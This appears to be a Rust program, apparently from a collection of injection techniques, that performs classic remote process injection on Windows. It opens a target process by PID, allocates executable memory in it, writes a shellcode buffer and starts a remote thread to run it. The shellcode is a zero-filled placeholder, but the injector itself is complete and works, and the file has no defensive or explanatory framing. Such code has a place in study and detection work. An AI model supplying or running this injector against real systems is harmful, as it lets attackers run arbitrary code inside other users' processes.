use std::{env::args, mem::transmute};
use windows::{
    Win32::{
        Foundation::{CloseHandle, GetLastError},
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
            Threading::{
                CreateRemoteThread, INFINITE, OpenProcess, PROCESS_ALL_ACCESS,
                THREAD_CREATION_FLAGS, WaitForSingleObject,
            },
        },
    },
    core::{Error, HRESULT, Result},
};

fn main() -> Result<()> {
    let shellcode: [u8; 460] = [0x00; 460];

    let pid: u32 = match args().nth(1) {
        Some(arg) => arg.parse().map_err(|_| Error::from_thread())?,
        None => {
            eprintln!("Usage: ./injectum_classic_remote.exe <PID>");
            return Ok(());
        }
    };

    unsafe {
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, pid)?;

        let h_memory = VirtualAllocEx(
            h_process,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if h_memory.is_null() {
            return Err(Error::from_hresult(HRESULT(GetLastError().0 as i32)));
        }

        let mut bytes_written: usize = 0;
        WriteProcessMemory(
            h_process,
            h_memory,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            Some(&mut bytes_written),
        )?;

        let mut thread_id: u32 = 0;
        let h_thread = CreateRemoteThread(
            h_process,
            None,
            0,
            Some(transmute(h_memory)),
            None,
            THREAD_CREATION_FLAGS(0).0,
            Some(&mut thread_id),
        )?;

        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread)?;
    };

    Ok(())
}
